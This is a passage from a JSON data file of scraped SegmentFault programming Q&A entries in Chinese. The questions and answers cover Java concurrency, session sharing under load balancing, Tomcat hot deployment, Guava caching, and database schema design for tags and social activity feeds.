      "dsc": "<div class=\"question fmt\" data-id=\"1010000000437040\">\n<p>普通单例模式我明白，但是现在希望实现每个线程都有一个唯一的单例，应该怎么做？<br>\n我知道用Threadlocal变量可以为每个线程提供一个独立的实例，但是不能保证这个实例是唯一的、不可变得。<br>\n如果用volatile修饰的话，按volatile的意义理解就是每个线程都有一份实例的副本，但是这些副本是不是同一个对象呢？</br></br></p>\n</div>",
      "favourite": "1",
      "glance": "2k",
      "tags": [
        "java",
        "设计模式",
        "多线程",
        "单例多线程"
      ],
      "time": "2014-03-15",
      "title": "Java如何为每个线程提供一个单例？",
      "url": "https://segmentfault.com/q/1010000000437040"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000442620\">\n<p>cookie存一个key，具体信息存在数据库里，可以用memcache/redis这些基于内存的key-value存储来加速</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000442634\">\n<p><a href=\"http://segmentfault.com/u/socrates\">@socrates</a> 提供了一个方法，另外也可以通过对IP做hash把相同用户的请求发送到同一后端，nginx就有这种简单的会话保持功能。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000442765\">\n<p>几个思路：</p>\n<p>1 、负载算法采用 IP hash ，把每次相同 IP 的请求转发到同一台 Web 服务器上。<br>\n缺点是不能有效利用到所有的 Web 服务器来做均衡负载，一般负载算法都是 Round Robin 。</br></p>\n<p>2 、重写 session handler , 把 session 用数据库来存储。<br>\n缺点是访问量高的情况下，IO 吞吐太高的话会影响网站性能。</br></p>\n<p>3 、把 session 的默认存储路径设置为 NFS 上的一块存储区域，这样所有的 Web 服务器就可以共享了。<br>\n缺点是一旦 NFS 挂了，session 就再也没有办法使用了。</br></p>\n<p>4 、最简单的，把 php.ini 里的 session save handler 设置为 memcache 或者 redis。<br>\n推荐用 memcache 。如果用 redis 的话，目前没有好用的 cluster 解决方案，而来 redis 还会把数据回写到硬盘上，完全没必要。而 memcache 只需要很少的配置就能做 cluster ，数据操作完全在内存里，速度杠杠滴。</br></p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000442612\">\n<p>对应用服务器做了负载均衡之后如何保持session等记录用户登录状态的会话信息？用cookie？但是这样觉得不太安全。</p>\n</div>",
      "favourite": "7",
      "glance": "6.4k",
      "tags": [
        "架构",
        "phpredis",
        "php",
        "java",
        "数据库"
      ],
      "time": "2014-03-22",
      "title": "对应用服务器做了负载均衡之后如何保持session等记录用户登录状态的会话信息？",
      "url": "https://segmentfault.com/q/1010000000442612"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000456909\">\n<p>默认就是热部署代码的了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000457268\">\n<p>只要部署 刷新就可以啦</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000473256\">\n<p>方法如下：<br>\n 第一步：    Tomcat安装目录下，修改 conf/server.xml 中的 Host 配置，设置其reloadable属性为true，即在Host标签中添加reloadable=\"true\"这一句，重启Tomcat使配置文件生效。<br>\n第二步：    在conf文件夹中的web.xml文件中添加 <init-param><param-name>development</param-name><param-value>true</param-value></init-param><br>\n第三步：          启tomcat服务器，使修改生效。</br></br></br></p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000456811\">\n<p>tomcat如何进行热部署代码？ tomcat版本是7</p>\n</div>",
      "favourite": "2",
      "glance": "3.8k",
      "tags": [
        "java",
        "tomcat"
      ],
      "time": "2014-04-04",
      "title": "tomcat如何进行热部署代码",
      "url": "https://segmentfault.com/q/1010000000456811"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000507434\">\n<p>不需要写客户端，有现成的代码，<code>HTML5</code> to <code>Java</code></p>\n<p><a href=\"https://code.google.com/p/java-large-file-uploader/\" rel=\"nofollow\">https://code.google.com/p/java-large-file-uploader/</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000507427\">\n<p>建议采用http协议，协议本身支持数据分片上传和下载，这样你的客户端只需要做些簿记工作，记录文件文件的上传长度。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000516388\">\n<p>自问自答，找到一个国人写的，简单一些的项目：<a href=\"http://www.twinkling.cn/\" rel=\"nofollow\"></a><a href=\"http://www.twinkling.cn/\" rel=\"nofollow\">http://www.twinkling.cn/</a>，挺有指导意义的~</p>\n<p>另外推荐一篇不错的文章：<a href=\"http://www.zhangxinxu.com/wordpress/2013/11/xmlhttprequest-ajax-localstorage-%E6%96%87%E4%BB%B6%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0\" rel=\"nofollow\">XMLHttpRequest实现HTTP协议下文件上传断点续传</a></p>\n<p>这是另一个开源项目：<a href=\"http://birdinroom.blog.51cto.com/7740375/1343892\" rel=\"nofollow\">Resumable.js</a>，都是就要http，都是依赖html5。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000471988\">\n<p>需求如下：<br>\n想实现一个支持大文件上传的客户端，支持断点续传，功能类似优酷视频发布的那个客户端。开发语言暂定java，不知道有什么好的开源项目参考没？或者提供一些相关资料文献~</br></p>\n<p>不胜感激~</p>\n</div>",
      "favourite": "9",
      "glance": "1.9k",
      "tags": [
        "java"
      ],
      "time": "2014-04-17",
      "title": "如何设计实现大文件上传功能？",
      "url": "https://segmentfault.com/q/1010000000471988"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000477887\">\n<p>求设计模式（Gof） 简单例子，语言最好是java的。</p>\n</div>",
      "favourite": "11",
      "glance": "1.6k",
      "tags": [
        "java",
        "设计模式"
      ],
      "time": "2014-04-22",
      "title": "设计模式（Gof） 简单例子",
      "url": "https://segmentfault.com/q/1010000000477887"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000481424\">\n<p>个人认为有两个原因，一是java码农们不愿意花时间研究前端以及其它非数据服务端编程的技术，特别是js以及计算机平面设计（当然，术业有专攻，但是你要想吃大的就得比别人会的多），老想着用代码凭空创造良好的用户提体验或者直接用别人写好的东西（例如bootstrap），而现在的web项目没有良好的交互体验就不会有好的前途（特指用户为普通网民的项目，不包括客户为程序员或者技术性公司的项目，如github）；二是，独立做项目的时候缺少动力或者持久的激情，并且老受到“追求重用，不想重复造轮子”“追求性能，力求抗住全宇宙的用户同时访问”“追求专业，不用到线程、进程、集群、大数据等等技术的话，我会屎”等等职业病的困扰，这属于心理问题。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000481269\">\n<p>因为，如果这个东西做出来了，那么其他的一些商城，内容系统就没有什么太大的发展空间了。而且，用JAVA写的成本要比起其他语言项目要高出很多。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000481486\">\n<p>Java的开源项目非常多，只是现成的应用比较少。<br>\n我认为原因是Java的部署难度更高。无论是对服务器的内存的要求，还是编译、打包、部署的繁琐。对于小项目而言，最不方便的地方就是更新代码大多时候必须要重新编译、打包、部署。<br>\n这个问题很大程度制约了Java在中小型应用中的发展，并且让各大空间提供商失去了支持Java的动力。<br>\n反观PHP就没有如上所述的这些问题，所以获得了各大空间提供商的青睐。由于网上PHP空间提供商众多，所以“开发可以扩展、重复利用的PHP应用”就成为了一件更有意义的行为。所以PHP才有这么多现成的应用可以直接拿来用或者做二次开发。</br></br></br></p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000481211\">\n<p>为什么开源的成型的Java Web项目这么少？网上找到的都是一些框架的集合，但是没有比如商城系统或者内容系统这样完整的案例</p>\n</div>",
      "favourite": "0",
      "glance": "3k",
      "tags": [
        "java"
      ],
      "time": "2014-04-24",
      "title": "为什么开源的成型的Java Web项目这么少？",
      "url": "https://segmentfault.com/q/1010000000481211"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000487261\">\n<p>如题，请简要明了的回答。三克油！！！</p>\n</div>",
      "favourite": "0",
      "glance": "2.4k",
      "tags": [
        "java",
        "锁"
      ],
      "time": "2014-04-29",
      "title": "synchronized  和 ReentrantLock  的 区别",
      "url": "https://segmentfault.com/q/1010000000487261"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002670814\">\n<p>因为你setDaemon(true)了啊，你这段代码执行main方法的时候就剩下守护线程了，JVM在这种情况下可能选择直接退出所以并不保证会执行完守护线程。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002883924\">\n<p>守护线程指的是 “守护” 创建它的线程。此时创建它的线程就是main线程。所以当执行到main函数的结尾的时候，守护线程也就挂掉了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000513101\">\n<p>我觉得可能的原因。</p>\n<p>因为主线程和你新开的线程运行的顺序并不是确定的，当新的线程要输出的时候，你的main线程可能已经退出了。由于你setDaemon(true)<br>\nMarks this thread as either a daemon thread or a user thread. The Java Virtual Machine exits when the only threads running are all daemon threads.<br>\n这样就算你还有一个daemon线程，jvm也会退出，因为没有普通的线程在运行，这样可能导致你的daemon线程中的printf没有输出内容。</br></br></p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000513070\">\n<p>在看Think In Java,验证其中的一则代码，发现其在Java6 或者Java 8下都是正确的，但是在Java7下却出现了异常,代码如下:</p>\n<pre><code class=\"lang-java\">package com.mobile.concurrency;\n\nimport java.util.concurrent.TimeUnit;\n\nclass ADaemon implements Runnable {\n    @Override\n    public void run() {\n        try{\n            System.out.println(\"starting daemon\");\n            TimeUnit.SECONDS.sleep(1);\n\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n             System.out.println(\"This should always run\");\n        }\n    }\n}\npublic class DaemonsDontRunFinally {\n    public static void main(String[] args) {\n        Thread t = new Thread(new ADaemon());\n        t.setDaemon(true);\n        t.start();\n        //System.out.println(\":\");\n    }\n}\n\n</code></pre>\n<p>在java6,8下面都能输出<code>starting daemon</code>,但是java7却是什么都不输出,当我在main里加入输出部分才输出<code>starting daemon</code>.<br>\n不太了解这部分知识,求指教，谢谢<br>\n=====update===<br>\n多测试了几次之后发现也并不是Java版本的问题,在7下面多测试几次也还是会出现能打印出来的情况</br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "java"
      ],
      "time": "2014-05-19",
      "title": "Java测试守护线程的一段程序在Java7下失效",
      "url": "https://segmentfault.com/q/1010000000513070"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000515843\">\n<p>刚转JAVA，接触Guava，所以可能没有把问题描述的过于清楚，请见谅。</p>\n<p>Guava中提供了<a href=\"http://ifeve.com/google-guava-cachesexplained/comment-page-1/#comment-19214\" rel=\"nofollow\">Cache模块</a>，下面的例子让我很困惑：</p>\n<pre><code class=\"lang-java\">package me.kazaff;\n\n\nimport com.google.common.cache.CacheBuilder;\nimport com.google.common.cache.CacheLoader;\nimport com.google.common.cache.LoadingCache;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class Main {\n\n    public static LoadingCache&lt;String, Person&gt; cache = CacheBuilder.newBuilder()\n                                                .maximumSize(1000)\n                                                .expireAfterAccess(10, TimeUnit.MINUTES)\n                                                .build(new CacheLoader&lt;String, Person&gt;() {\n                                                    @Override\n                                                    public Person load(String s) throws Exception {\n\n                                                        Person p = new Person();\n                                                        p.setName(s);\n                                                        p.setAge(0);\n                                                        return p;\n                                                    }\n                                                });\n\n    public static void main(String[] args) {\n        try{\n\n            Person p = cache.get(\"kazaff\");\n            p.setName(\"edisondik\"); //直接修改对象\n\n            System.out.println(\"object: \" + p.getName());\n            System.out.println(\"cache: \" + cache.get(\"kazaff\").getName());\n\n        }catch (Exception e){\n            System.out.println(e.getCause());\n        }\n    }\n}\n</code></pre>\n<p>终端打印：</p>\n<pre><code>Object: edisondik\ncache: edisondik\n</code></pre>\n<p>可以看到，我并没有在修改完对象后重新保存到缓存中，它是如何做到的？<br>\n给我的感觉就好像是cache.get直接返回的引用一样！</br></p>\n<p>谁能给我解释一下呢？</p>\n</div>",
      "favourite": "0",
      "glance": "2.4k",
      "tags": [
        "java",
        "guava"
      ],
      "time": "2014-05-21",
      "title": "疑惑Guava中的Cache是如何做到“直接修改内存副本”的？",
      "url": "https://segmentfault.com/q/1010000000515843"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000521777\">\n<p>感谢回答，综合考虑之后最后的实现方式如下：<br>\n数据使用 HashMap 来存储。<br>\n做 TopN 时单独定义一个 PriorityQueue，new 的时候用匿名类的方式继承一个 Comparator，将 HashMap 中的 value 作为比较对象。</br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000521314\">\n<p>既然是TopN，那毫无疑问你要用Heap</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000521552\">\n<p>可以用TreeSet</p>\n<pre><code class=\"lang-java\">class MyMap&lt;K, V&gt; {\n  class Element implements Comparalble&lt;Element&gt; {\n    private K key;\n    private V value;\n    public int compareTo(Element e) {\n      var c = value.compareTo(e.value); \n      return c == 0 ? key.compareTo(e.key) : c;\n    }\n  }\n\n  Map&lt;K, V&gt; map = new HashMap&lt;K, V&gt;();\n  SortedSet&lt;Element&gt; set = new TreeSet&lt;Element&gt;();\n\n  void put(K key, V value) {\n    map.put(key, v);\n    set.add(new Element(key, value);\n  }\n  void update(K key, V newValue) {\n    V oldValue = map.put(key, newValue);\n    if (oldValue != null) {\n      set.remove(new Element(key, oldValue));\n    }\n    set.add(new Element(key, newValue));\n  }\n  Element[] topN(int n) {\n    Element[] ret = new Element[n];  \n    int i = 0;\n    for(Element e : set) {\n        ret[i++] = e;\n        if (i &gt;= n) {\n            break;\n        }\n    } \n    return ret;\n  }\n}\n</code></pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000521272\">\n<p>目前的数据以 K-V 对的形式存在一个 Map 里，需要用到的操作如下：<br>\n1. 对于某个外来数据，检查是否存在在 map 中，这一点 HashMap 可以实现。<br>\n2. 根据 key 来获取并修改 map 中的数据，这一点 HashMap 也可以实现。<br>\n3. 按照 value 的值来做 TopN，我就是在这里遇到点麻烦，HashMap 实现有些复杂。</br></br></br></p>\n<p>我不知道有没有其他数据结构更适合做这个工作，有什么好的建议吗？<br>\nP.S. 第3点的操作相对1、2来说没有那么频繁。<br>\nP.S.S. 语言是 Java。</br></br></p>\n</div>",
      "favourite": "2",
      "glance": "1.2k",
      "tags": [
        "java"
      ],
      "time": "2014-05-27",
      "title": "这种情况该用什么数据结构？",
      "url": "https://segmentfault.com/q/1010000000521272"
    }
  ],

  "数据库": [
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000645042\">\n<p>这是你想要的 <a href=\"http://blog.csdn.net/java2king/article/details/6010250\" rel=\"nofollow\">http://blog.csdn.net/java2king/article/details/6010250</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003409656\">\n<p>怎样获取不同模块内容信息，你这个查询这张表，只能查出id，并没有具体的内容</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000645067\">\n<p><a href=\"http://www.oschina.net/question/12_70587\" rel=\"nofollow\">http://www.oschina.net/question/12_70587</a> 这个比较符合我的问题意思</p>\n<p>最终我参考开源中国做了调整，以完成我们的需求：</p>\n<p><strong>动态的结构：</strong></p>\n<pre><code class=\"lang-php\"> {\n      user_id:13,\n      action: 行为,\n\n      object_id: 对象ID,\n      object_type: 对象类型,\n      object_user_id: 对象用户ID,\n\n      parent_object_id: 对象父级ID,\n      parent_object_type: 对象父级类型,\n      parent_object_user_id: 对象父级用户ID,\n\n      reply_id: 回复ID,    // action为回复时有用\n      parent_reply_id: 回复的父级回复ID,       // action为回复时有用，回复了别人对评论的回复\n      text: '转发或者分享时附加文字',\n\n      view_count: 0,\n\n      created_at: 创建时间,\n      deleted_at: 删除时间,\n }\n\n</code></pre>\n<p>说明：<br>\n1. <code>object_*</code> 只存储主要模块内容信息，不含评论；<br>\n2. <code>parent_object_*</code> 存储有嵌套关系的对象，比如当<code>object_*</code> 为答案时，<code>parent_object_*</code>为问题；<br>\n3. <code>reply_id</code>  用于直接回复评论时用到；<br>\n4. <code>parent_reply_id</code> 父回复ID;<br>\n5. 两个回复ID，使用情况是：当回复了别人的回复时，根据<code>comment_id</code>拉取评论与全部回复，在模板显示时只显示对话的两个回复。</br></br></br></br></br></p>\n<p><strong>场景列表：</strong></p>\n<p>一级结构：</p>\n<ul>\n<li>\n<strong>安正超</strong> <strong>发布</strong> 了 <strong>文章</strong>\n</li>\n</ul>\n<pre><code class=\"lang-php\"><br>'action'         =&gt; NEW,\n'user_id'        =&gt; 安正超ID,\n\n'object_id'      =&gt; 文章ID,\n'object_user_id' =&gt; 安正超ID,\n'object_type'    =&gt; ARTICLE,\n\n</br></code></pre>\n<ul>\n<li>\n<strong>安正超</strong> <strong>上传</strong> 了 N张 <strong>图片</strong>\n</li>\n</ul>\n<pre><code class=\"lang-php\"><br>'action'         =&gt; NEW,\n'user_id'        =&gt; 安正超ID,\n\n'object_id'      =&gt; 图片ID（数组，以逗号隔开）,\n'object_user_id' =&gt; 安正超ID,\n'object_type'    =&gt; PICTURE,\n\n</br></code></pre>\n<ul>\n<li>\n<strong>安正超</strong> 提了 <strong>问题</strong> xxxx</li>\n</ul>\n<pre><code class=\"lang-php\"><br>'action'         =&gt; NEW,\n'user_id'        =&gt; 安正超ID,\n\n'object_id'      =&gt; 问题ID,\n'object_user_id' =&gt; 安正超ID,\n'object_type'    =&gt; QUESTION\n\n</br></code></pre>\n<p>二级结构：</p>\n<ul>\n<li>\n<strong>安正超</strong> <strong>评论</strong> 了 <strong>文章</strong> xxxx（<strong>回答</strong>了通用）</li>\n</ul>\n<pre><code class=\"lang-php\"><br>展示：\n  文章： xxxxx\n      评论：xxxxx (李林评论的)\n\n</br></code></pre>\n<pre><code class=\"lang-php\"><br>'action'         =&gt; COMMENT,\n'user_id'        =&gt; 安正超ID,\n\n'object_id'      =&gt; 评论ID,\n'object_type'    =&gt; COMMENT,\n'object_user_id' =&gt; 安正超ID\n\n'parent_object_id'      =&gt; 文章ID,\n'parent_object_user_id' =&gt; 作者ID\n'parent_object_type'    =&gt; ARTICLE,\n\n</br></code></pre>\n<p>三级结构：</p>\n<ul>\n<li>\n<strong>安正超</strong> 在 <strong>文章</strong> 中 <strong>回复</strong> 了 <strong>李林</strong> 的 <strong>评论</strong>\n</li>\n</ul>\n<pre><code class=\"lang-php\"><br>展示：\n\n  文章： xxxxx\n      评论：xxxxx (李林评论的)\n          回复:xxxx (安正超)\n\n</br></code></pre>\n<pre><code class=\"lang-php\">'action'         =&gt; REPLY,\n'user_id'        =&gt; 安正超ID,\n\n'object_id'      =&gt; 评论ID,\n'object_type'    =&gt; COMMENT,\n'object_user_id' =&gt; 李林ID\n\n'parent_object_id'      =&gt; 文章ID,\n'parent_object_user_id' =&gt; 作者ID\n'parent_object_type'    =&gt; ARTICLE,\n\n'reply_id'       =&gt; 安正超的回复ID\n\n</code></pre>\n<p>四级结构：</p>\n<ul>\n<li>\n<strong>安正超</strong> <strong>回复</strong>了 <strong>李文凯</strong> 在 <strong>问题</strong> “xxxx” 中 <strong>李林</strong> 的<strong>答案</strong> 下的 <strong>评论</strong>\n</li>\n</ul>\n<p>说明：问题信息从答案接口取回</p>\n<pre><code class=\"lang-php\"><br>展示：\n\n  问题： xxxxx\n     答案1...\n     答案2...\n     答案3...(李林回答的)\n        评论：xxxxx (李文凯评论的)\n            回复:xxxx (安正超)\n\n</br></code></pre>\n<pre><code class=\"lang-php\"><br>'action'         =&gt; RESPOND,\n'user_id'        =&gt; 安正超ID,\n\n'object_id'      =&gt; 评论ID,\n'object_type'    =&gt; COMMENT,\n'object_user_id' =&gt; 李文凯的ID\n\n'parent_object_id'      =&gt; 答案ID,\n'parent_object_type'    =&gt; ANSWER,\n'parent_object_user_id' =&gt; 李林ID\n\n'reply_id'       =&gt; 安正超的回复ID\n\n</br></code></pre>\n<ul>\n<li>\n<strong>安正超</strong> <strong>回复</strong>了 <strong>李文凯</strong> 在 <strong>问题</strong> “xxxx” 中 <strong>李林</strong> 的<strong>答案</strong> 下的 <strong>回复</strong>\n</li>\n</ul>\n<p>说明：问题信息从答案接口取回</p>\n<pre><code class=\"lang-php\"><br>展示：\n\n  问题： xxxxx\n     答案1...\n     答案2...\n     答案3...(李林回答的)\n        评论：xxxxx (A评论的)\n            李文凯 回复 A:xxxx\n            安正超 回复 李文凯:xxxx\n</br></code></pre>\n<pre><code class=\"lang-php\"><br>'action'         =&gt; RESPOND,\n'user_id'        =&gt; 安正超ID,\n\n'object_id'      =&gt; 评论ID,\n'object_type'    =&gt; COMMENT,\n'object_user_id' =&gt; A的ID\n\n'parent_object_id'      =&gt;  答案ID,\n'parent_object_type'    =&gt;  QUESTION,\n'parent_object_user_id' =&gt;  李林ID,\n\n// 以下两个回复只在模板中用到用以决定显示哪两个回复，因为根据comment_id带着回复会全部拉回来\n\n'parent_reply_id' =&gt; 李文凯的回复ID,\n'reply_id'        =&gt; 安正超的回复ID,\n\n</br></code></pre>\n<p>欢迎各位指正！</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000644951\">\n<p>最近在做类似的功能，遇到几个问题：<br>\n1. 动态类型多样性;<br>\n2. 数据模块化存储，各模块间通过rest调用数据，造成拉取动态列表响应时间变长;<br>\n3. 数据层级复杂，编码逻辑通用性差。例如：转发一篇文章后，评论该转发，然后回复该评论时的对象层级为: 回复-&gt;评论-&gt;文章。</br></br></br></p>\n<p>求有相关经验者分享一下经验为谢！</p>\n<p>以下是现有的设计:</p>\n<p><strong>动态的结构：</strong></p>\n<pre><code> {\n      user_id: 动态创建者ID,\n      action: 行为类型,\n      object_type: 动态对象类型,\n      object_id: 对象ID,\n      object_user: 对象所有者,\n      view_count: 0,\n      created_at: 创建时间,\n      deleted_at: 删除时间,\n }\n</code></pre>\n<p><strong>场景列表：</strong></p>\n<pre><code>// A 发布 了 文章 xxx \n'action'      =&gt; NEW,\n'user_id'     =&gt; A的ID,\n'object_id'   =&gt; 文章ID,\n'object_user' =&gt; A的ID,\n'object_type' =&gt; ARTICLE,\n'ext'         =&gt; [], \n\n// A 发布 了 N张 图片 \n'action'      =&gt; NEW,\n'user_id'     =&gt; A的ID,\n'object_id'   =&gt; 图片ID（数组，以逗号隔开）,\n'object_user' =&gt; A的ID,\n'object_type' =&gt; PICTURE,\n'ext'         =&gt; [], \n\n// 4. A 提了 问题 xxxx\n'action'      =&gt; NEW,\n'user_id'     =&gt; A的ID,\n'object_id'   =&gt; 问题ID,\n'object_user' =&gt; A的ID,\n'object_type' =&gt; QUESTION,\n'ext'         =&gt; [], \n\n// 5. A 在 文章 中回复了 B 的 评论\n'action'      =&gt; REPLY,\n'user_id'     =&gt; A的ID,\n'object_id'   =&gt; 评论ID,\n'object_user' =&gt; B的ID,\n'object_type' =&gt; COMMENT,\n'ext' =&gt; [\n    'text' =&gt; $text,\n    'comment_target_id'   =&gt; '文章ID', //评论所属对象\n    'comment_target_type' =&gt; 'ARTICLE',//评论所属对象类型\n    'reply_id' =&gt; 回复ID,\n],  \n\n// 6. A 评论 了 B的 文章 xxxx\n'action'      =&gt; COMMENT,\n'user_id'     =&gt; A的ID,\n'object_id'   =&gt; 文章ID,\n'object_user' =&gt; B的ID,\n'object_type' =&gt; 'ARTICLE',\n'ext' =&gt; [\n    'comment_id' =&gt; '评论ID',\n],  \n\n// 7. A 回答 了 B 的 提问 xxx\n'action'      =&gt; RESPOND,\n'user_id'     =&gt; A的ID,\n'object_id'   =&gt; 问题ID,\n'object_user' =&gt; B的ID,\n'object_type' =&gt; QUESTION,\n'ext' =&gt; [\n    'answer_id' =&gt; '答案ID',\n],  \n</code></pre>\n</div>",
      "favourite": "43",
      "glance": "5.9k",
      "tags": [
        "php",
        "数据库",
        "好友",
        "社交网站",
        "社交"
      ],
      "time": "2014-08-22",
      "title": "类似QQ空间的社交网站的用户动态的数据库应该怎么设计？",
      "url": "https://segmentfault.com/q/1010000000644951"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097814\">\n<p>其实你最后的问题就是想怎么过滤tag吧.这个我只想到了一个比较笨得方法，给tag加个状态属性，管理员审核通过才显示，不通过就仅仅是文章tag或者你直接删掉也行。感觉对付小站应该足够了吧，问题是不能实时就是了。<br/>\nPS:个人觉得中间表和tag表是不是可以合到一个表中去呢？</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000097811\">\n<p>在国内想要标签能比较好的利用，不被滥用，尤其是在非我们这样专业领域的网站，你需要做一些工作。</p><ol><li>自己内置系统标签库</li><li>通过分词技术给没有设置标签的用户给与默认标签，或者推荐标签。</li><li>明显不对的标签可以过滤掉（过滤可以通过运营手段，也可通过技术手段），比如你说的SSSSSSSS</li></ol><p>至于表的设计，node和tag建立manytomany就可以了。<br/>\n你代码中的SQL中没有table name ？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000097809\">\n<p>你需要搜索引擎。。。<br/>\nTAG的具体名字只出现在展示的时候，具体到底层的搜索全部转换成数字。<br/>\n在搜索引擎里，用多值整数这种东西来匹配。</p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095313\">\n<p>自己打算弄个小站，遭遇数据库Tag的设计问题，感觉自己的方案笨，发出来大家拍砖一下，顺便收集点意见。</p><p>谢谢。</p><p>小站的主体是类似Typecho这样的，主要文章发布的一个系统。由于需要为每个文章打上Tag，我经过Google，结合自己的实际（SQL不行，略懂吧），得出以下简单的方案：</p><pre>CREATE TABLE IF NOT EXISTS `items` (\n`id` int(11) unsigned NOT NULL auto_increment,\n`tags` varchar(100) NOT NULL default '',\n`text` longtext\n) ENGINE=MyISAM  DEFAULT CHARSET=utf8  ;</pre><p>这个是最简单的方法了，就是在每个文章的表项目中添加自己的Tag，这样从数据库中Select文章输出时候，最方便。</p><p>但问题来了，由于我需要设计一个类似SF的Tag标签汇总页面（比如这个关于PHP的  <a href=\"http://segmentfault.com/tag/php\" rel=\"nofollow\" target=\"_blank\" title=\"http://segmentfault.com/tag/php\">http://segmentfault.com/tag/php</a> 的页面），就是列出所有有关PHP的文章时候，我的这个数据库方案显得很郁闷。而且我的SQL功底不是很好，连个查询Tag的SQL语句都只能用到like了。</p><p>考虑到范式，还有其他一些情况，我决定在第一种方案下将Tag独立出来，使用中间表将Tag与文章表连接起来，大体如下：</p><pre>CREATE TABLE IF NOT EXISTS `items` (\n`id` int(11) unsigned NOT NULL auto_increment,\n`text` longtext\n) ENGINE=MyISAM  DEFAULT CHARSET=utf8  ;\n/**\n    作为中间表让item和tag连接起来\n*/\nCREATE TABLE IF NOT EXIST `rel_item_tag` (\n`id` int(11) auto_increment,\n`item_id` int(11),\n`tag_id` int(11)\n);\n\nCREATE TABLE IF NOT EXIST `tags` (\n`id` int(11) auto_increment,\n`tags` varchar(100) NOT NULL default '',\n);</pre><p>这样设计后，貌似还有问题的，考虑到我的要求，文章由作者发布，那么Tag也是作者给标上去的。而且我也是需要像SF这样整理每个Tag的介绍什么的，那用户随便弄个SSSSSSSSSS这样的Tag，然后使用/tag/SSSSSSSSSS 这样的网址来访问，这该情何以堪啊。</p><p>所以，我卡壳了，上来SF吐槽一下。唉，大学没有学好SQL的同学真伤不起啊！</p><p>看到SF的标签系统设计得挺好的，上来讨教一下。谢谢各位大神！</p><p>搜索来的资料参考：</p><ul><li><a href=\"http://icyleaf.com/2008/06/21/tags-database-schemas/\" rel=\"nofollow\" target=\"_blank\" title=\"http://icyleaf.com/2008/06/21/tags-da...\">http://icyleaf.com/2008/06/21/tags-da...</a></li><li><a href=\"http://www.21andy.com/blog/20071222/769.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://www.21andy.com/blog/20071222/7...\">http://www.21andy.com/blog/20071222/7...</a></li></ul>\n</div>",
      "favourite": "16",
      "glance": "7.5k",
      "tags": [
        "数据库",
        "sql"
      ],
      "time": "2011-12-23",
      "title": "关于数据库中Tag的设计",
      "url": "https://segmentfault.com/q/1010000000095313"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000202493\">\n<p>Tag系统的话，感觉用redis会更方便一点。对于这个问题，在redis里面可以用SET就可以了。</p>\n<p><a href=\"http://redis.io/topics/data-types\" rel=\"nofollow\">http://redis.io/topics/data-types</a></p>\n<p>Redis Sets are good to represent relations. You can create a tagging system with Redis using a Set to represent every tag. Then you can add all the IDs of all the objects having a given tag into a Set representing this particular tag, using the SADD command. Do you want all the IDs of all the Objects having a three different tags at the same time? Just use SINTER.</p>\n<p>如果你其他部分使用mongo的话，单独的实时更新的tag增减和某个tag中对于event的增减也可以用redis。</p>\n<p>如果要记录每个tag的被采纳次数，再加一个以tag文本为key，以采纳数为value的HASH就可以了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000203239\">\n<p>数据量大，要花大力气搞的话 可以考虑 MySQL 和 Sorl 结合。</p>\n<p>数据量不大，完全可以考虑把tag作为一个分类去做，保存在MySQL。</p>\n<p>MySQL没有你想的那么慢。</p>\n</div>",
